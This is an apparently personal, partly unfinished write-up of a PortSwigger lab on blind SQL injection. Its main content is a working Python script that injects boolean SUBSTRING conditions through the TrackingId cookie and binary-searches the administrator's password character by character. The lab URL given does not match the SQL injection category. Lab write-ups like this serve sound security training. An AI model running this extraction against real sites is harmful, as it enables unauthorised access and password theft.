
#portswigger #solution #sqli

- **Category:** **SQL injection**
- **Difficulty:** [[PRACTITIONER]]
- **URL Lab:** https://portswigger.net/web-security/learning-paths/file-upload-vulnerabilities
- **Date Solved:** 2026-08-03

---

## 🎯 1. Lab Objective
> The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.

---

## 🔍 2. Reconnaissance & Vulnerability Analysis

- When accessing the website first time, no "Welcome back!" greeting appears
 ![[Pasted image 20260803183613.png]]

- An cookie's been assigned named "TrackingId" in the response:
![[Pasted image 20260803183725.png]]

- After that, every 


---

## 🚀 3. Exploitation

1. **Step 1:** 
2. **Step 2:** 
3. **Step 3:** 
4. **Step 4:** 

---

## ⚡ 4. PoC / Final Payload


```python
import requests

cookies = {
    'TrackingId': "Q1YRWZXBzjbXEG7Q' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1) > 'a",
    'session': 'i7Axt75lKoLLNStQa7dzlgLBu0vfRtbj',
}

headers = {
    'Host': '0aa600f0033dedfb81a08ac600f200b4.web-security-academy.net',
    'Sec-Ch-Ua': '"Not;A=Brand";v="8", "Chromium";v="150"',
    'Sec-Ch-Ua-Mobile': '?0',
    'Sec-Ch-Ua-Platform': '"Windows"',
    'Accept-Language': 'en-US,en;q=0.9',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Sec-Fetch-Site': 'none',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-User': '?1',
    'Sec-Fetch-Dest': 'document',
    # 'Accept-Encoding': 'gzip, deflate, br',
    'Priority': 'u=0, i',
    # 'Cookie': "TrackingId=Q1YRWZXBzjbXEG7Q' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1) > 'o; session=i7Axt75lKoLLNStQa7dzlgLBu0vfRtbj",
}

with open("char.txt", "r") as f:
    char_list = list(map(str.strip, f.readlines()))

left = 0
right = len(char_list) - 1

ans = ""

for i in range(1, 21):
    left = 0
    right = len(char_list) - 1
    while right > left:
        mid = (left + right)//2
        cookies['TrackingId'] = f"Q1YRWZXBzjbXEG7Q' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),{i},1) > '{char_list[mid]}"
        response = requests.get(
            'https://0aa600f0033dedfb81a08ac600f200b4.web-security-academy.net/',
            cookies=cookies,
            headers=headers,
        )
        #true:
        if "Welcome" in response.text:
            left = mid+1
        #false
        else:
            right = mid
    ans+= char_list[left]

print("MAT KHAU CUA THANG ADMIN LA: ", ans)
```


---
## 💡 5. Key Takeaways & Remediation

- **Key Concept:**
- **Remediation:**